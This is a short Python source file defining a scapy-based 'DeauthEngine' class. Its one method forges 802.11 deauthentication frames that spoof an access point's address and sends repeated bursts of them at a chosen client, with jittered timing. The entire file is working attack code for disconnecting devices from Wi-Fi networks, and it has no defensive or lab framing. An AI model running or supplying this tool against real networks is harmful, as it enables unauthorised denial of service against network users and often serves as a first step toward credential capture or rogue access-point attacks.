from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import time
import random

class DeauthEngine:
    def __init__(self, interface="wlan0mon"):
        self.interface = interface

    def deauth_client(self, client_mac, ap_mac, count=50, jitter=0.1):
        print(f"[+] Deauthenticating {client_mac} from {ap_mac}")
        pkt = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
        for _ in range(count):
            sendp(pkt, iface=self.interface, verbose=0)
            if jitter > 0:
                time.sleep(random.uniform(0, jitter))
        print("[+] Deauth complete.")